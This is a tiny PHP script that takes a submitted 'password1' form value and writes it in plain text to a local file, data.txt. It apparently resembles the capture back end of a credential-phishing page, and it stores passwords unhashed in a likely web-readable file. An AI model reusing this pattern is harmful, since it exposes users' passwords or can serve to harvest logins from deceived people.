<?php
              
if(isset($_POST['password1']))
{
$data=$_POST['password1'];

$fp = fopen('data.txt', 'w');

fwrite($fp, $data);
fclose($fp);
}
?>
